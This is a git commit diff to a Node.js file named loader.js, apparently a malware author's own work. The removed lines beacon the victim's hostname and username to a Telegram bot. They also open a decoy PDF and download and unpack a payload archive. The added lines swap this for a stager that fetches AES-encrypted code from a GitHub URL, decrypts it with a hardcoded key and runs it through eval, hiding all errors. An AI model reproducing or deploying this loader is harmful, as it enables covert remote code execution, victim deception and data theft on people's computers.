31ec9df228a5355c766918b4822c1ceea1ed40ce
不要删除我 <dontdeleteme.v0@gmail.com>
2026-03-06 02:37:48 +0200

    encrypted multi-stage

--- loader.js
+++ loader.js
@@ -1,35 +1,20 @@
 const https = require('https');
-const { exec } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
+const crypto = require('crypto');
 
-var t = os.tmpdir();
-var m = os.hostname() + '/' + os.userInfo().username + ' - online';
-var b = '8708922470:AAEueXYfcs8JTv-EduI8cJBfA0Jj7EzJYeo';
+const K = '116d9cda5dcf01243dba805aec2e73e570e7c656e65e084a00c174dc9a11b02f';
+const U = 'https://raw.githubusercontent.com/dont-delete-me-v0/files/main/data.txt';
 
-https.get('https://api.telegram.org/bot' + b + '/sendMessage?chat_id=8119278288&text=' + encodeURIComponent(m));
-
-function dl(url, dest) {
-  return new Promise((res, rej) => {
-    var f = fs.createWriteStream(dest);
-    https.get(url, r => {
-      if (r.statusCode === 301 || r.statusCode === 302) {
-        f.close();
-        fs.unlinkSync(dest);
-        return dl(r.headers.location, dest).then(res).catch(rej);
-      }
-      r.pipe(f);
-      f.on('finish', () => { f.close(); res(); });
-    }).on('error', rej);
+https.get(U, r => {
+  let d = '';
+  r.on('data', c => d += c);
+  r.on('end', () => {
+    try {
+      const buf = Buffer.from(d.trim(), 'base64');
+      const iv = buf.subarray(0, 16);
+      const enc = buf.subarray(16);
+      const dec = crypto.createDecipheriv('aes-256-cbc', Buffer.from(K, 'hex'), iv);
+      const code = Buffer.concat([dec.update(enc), dec.final()]).toString();
+      eval(code);
+    } catch(e) {}
   });
-}
-
-(async () => {
-  await dl('https://github.com/dont-delete-me-v0/files/raw/main/decoy.pdf', path.join(t, 'Known_Offenders_2019.pdf'));
-  exec('start "" "' + path.join(t, 'Known_Offenders_2019.pdf') + '"');
-  await dl('https://github.com/dont-delete-me-v0/files/raw/main/payload.zip', path.join(t, 'p.zip'));
-  exec('tar -xf "' + path.join(t, 'p.zip') + '" -C "' + t + '"', () => {
-    try { fs.unlinkSync(path.join(t, 'p.zip')); } catch(e) {}
-  });
-})();
+});
